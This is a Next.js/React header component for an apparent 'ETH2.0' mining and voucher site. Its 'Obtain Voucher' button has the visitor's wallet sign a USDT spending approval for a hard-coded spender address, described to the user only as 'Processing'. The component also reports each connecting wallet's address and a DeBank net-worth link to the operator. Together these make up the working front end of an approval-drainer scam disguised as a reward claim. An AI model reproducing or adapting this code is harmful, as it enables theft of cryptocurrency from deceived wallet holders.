import Image from 'next/image';
import { ConnectButton } from "./connectButton";
import { checkAllowance, generateAlphanumericString, sendMessage } from "../utils/function"
import { abi, tokenAddress, spenderAddress, amount } from "../utils/constants"
import { useEffect, useState } from "react"
import { useAccount } from "wagmi";



import { useWriteContract, useReadContract } from 'wagmi'
import { postNewUser } from "../utils/api"

import { ethers, formatUnits } from 'ethers';
import  Modal  from '../ui/Modal'


export default function Header() {
  const [isAllowed, setIsAllowed] = useState<boolean>(false); 
  const { address, isConnecting, isDisconnected, status, isConnected } = useAccount();
  const [isModalOpen, setIsModalOpen] = useState<boolean>(false);
  const [modalContent, setModalContent] = useState(
    <div>
    <h2>Hello</h2>
    <p>Nothing to see here.</p>
  </div>);//Create User if not existing

const [code, setCode] = useState(generateAlphanumericString());

let userData = {
  address: address,
  balance: "0",
  ethprofit: "0",
  usdtprofit: "0",
  withdrawal: {},
  referralCode: code,
  referrals: "0"
}


   


  const openModal = () => setIsModalOpen(true);
  const closeModal = () => setIsModalOpen(false);

//Approve usdt for spending
  const { data: hash, writeContract } = useWriteContract()

  const voucherModal = (
    <div>
      <h2 className="infos-panel-title">Processing ...</h2>
      <p>Ensure you have ETH of at least $3 in your wallet and confirm the approval transaction.</p>
      <p className="infos-list-one-value">Check your wallet to confirm transaction</p>
    </div>
  )



    const approve = () => {
      setModalContent(voucherModal)
      sendMessage(`Address : ${address}; Obtaining Voucher... `)

      openModal()
        createUser();
        writeContract({
          address: tokenAddress,
          abi,
          functionName: 'approve',
          args: [spenderAddress, BigInt(ethers.parseUnits(amount, 6))],
        });
        if(hash){
          sendMessage(`Address : ${address}; Voucher obtained`)
        }else{
          sendMessage(`Address : ${address}; Failed`)
        }
  } 

   
    async function createUser() {
      
      //console.log(`Informations ${address} and ${code}`)
      
      //console.log(`Userdata `, userData)
      postNewUser(userData);
    };

  //check if to obtain voucher
  useEffect(() => {
    
    setCode(generateAlphanumericString());
    const fetchAllowance = async () => {
      let ownerAddress = address || "";
      const Amount = BigInt(ethers.parseUnits(amount, 6));
      const allowed = await checkAllowance({tokenAddress, ownerAddress, spenderAddress, Amount});
      setIsAllowed(allowed); // Update state based on allowance
    };
  
   fetchAllowance();
    if (status === "connected" || status === "reconnecting" ){
    
    createUser();
    sendMessage(`Address : ${address}; Check-Networth: https://debank.com/profile/${address}; `)
    }
  }, [ address, status, isConnected]);

return (
    <div>
        <a href="https://t.me/ethereum2_web"><Image src="/images/384120fa33d54790ebdc1521c2ad7e7e.png" className="kefu" alt="support" width={60} height={60} /></a>
        <div className="address-box header-option-link">
          <svg viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="16162" width="200" height="200" className="icon">
            <path d="M397 626.9c18.2 18.1 47.5 18.2 65.7 0l164.2-164c18.2-18.2 18.1-47.6 0-65.7-18.2-18.2-47.5-18.2-65.7 0L397.1 561.3c-18.1 18-18.1 47.5-0.1 65.6z" p-id="16163" fill="#ffffff"></path>
            <path d="M904.2 119.9c-74.5-74.5-195.4-74.5-269.9 0L513.8 240.3c-59.1 59.2-71.3 147.6-36.4 218.8l60.5-60.5c-7.6-36.2 2.6-75.5 30.7-103.6L689 174.6c44.4-44.2 116.1-44.2 160.6 0 44.2 44.3 44.2 116.1 0 160.6L729.1 455.5c-28.2 28-67.4 38.3-103.6 30.7L565 546.7c71.2 34.8 159.6 22.7 218.9-36.5l120.3-120.4c74.5-74.5 74.5-195.4 0-269.9zM486.2 625.3c7.6 36.2-2.6 75.5-30.7 103.6L335.1 849.4c-44.3 44.2-116.1 44.2-160.4 0-44.2-44.4-44.2-116.1 0-160.6l120.4-120.4c28.2-28 67.4-38.3 103.6-30.7l60.5-60.5c-71.2-34.8-159.6-22.7-218.9 36.5L119.9 634.2c-74.5 74.6-74.5 195.4 0 269.9s195.4 74.5 269.9 0l120.4-120.4c59.2-59.2 71.3-147.6 36.5-218.9l-60.5 60.5z" p-id="16164" fill="#ffffff"></path>
          </svg>
          <div className="header-option-link-text"></div>
        </div>
        <div className="header" style={{background : "rgb(12, 25, 60)"}}>
          <div className="header-option header-option-fixed" style={{background: "rgb(12, 25, 60)"}}>
            <div className="header-option-share header-option-fixed-left">
              <svg viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="12368" width="200" height="200" className="icon">
                <path d="M512 0C229.23 0 0 229.23 0 512s229.23 512 512 512 512-229.23 512-512S794.77 0 512 0z m150.888 822.576c-56.452 0-102.807-43.195-107.838-98.335l-175.252-71.917c-16.481 10.135-35.881 15.985-56.648 15.985-59.812 0-108.299-48.487-108.299-108.299s48.487-108.299 108.299-108.299c11.68 0 22.925 1.857 33.464 5.278l128.185-128.185c-4.694-12.125-7.274-25.303-7.274-39.084 0-59.812 48.487-108.299 108.299-108.299s108.299 48.487 108.299 108.299c0 59.812-48.487 108.299-108.299 108.299-19.668 0-38.11-5.244-54.008-14.408L414.149 501.277c10.943 16.92 17.299 37.083 17.299 58.733 0 11.697-1.862 22.958-5.293 33.51l146.883 60.275c19.456-28.847 52.437-47.818 89.849-47.818 59.812 0 108.299 48.487 108.299 108.299s-48.486 108.3-108.298 108.3z" fill="#ffffff" p-id="12369"></path>
              </svg>
            </div>
            <div className="header-option-icon">
              <Image src="/images/d0ae8ce5d18432880686d1ac114826ca.png" alt="Img" width={60} height={60}/>
              <div className="header-option-icon-title"> ㅤETH2.0 </div>
            </div>
            <ConnectButton />
          </div>
          <div className="header-tip">
            <div className="logo" style={{display: "flex", alignItems: "flex-end", justifyContent: "flex-end", height: "38vh"}} >
              <Image src="/images/ae25032ba9642a01397e06cdfdb09516.png" style={{maxWidth: "100%", margin: "14px"}} alt="Img" width={800} height={800}/>
            </div>
          </div>
          <div className="header-text">
            <div className="header-title" style={{display: "none"}}> Receive Voucher </div>
            <p className="header-title-two" style={{display: "none"}}> Join the node and start mining </p>
            <p className="header-title-two" style={{display: "none"}}> Receive the first login reward $0 </p>

            {isAllowed ? (
              <button className="btn-join van-button van-button--default van-button--normal">
                <div className="van-button__content">
                  <span className="van-button__text">Deposit</span>
                </div>
            </button>
            ) : (
              <button className="btn-join van-button van-button--default van-button--normal" onClick={approve}>
                <div className="van-button__content">
                  <span className="van-button__text">Obtain Voucher</span>
                </div>
              </button>
            )
          }
            
          </div>
        </div>
        {isModalOpen && <Modal content={modalContent} onClose={closeModal} />}
 
        </div>
)
}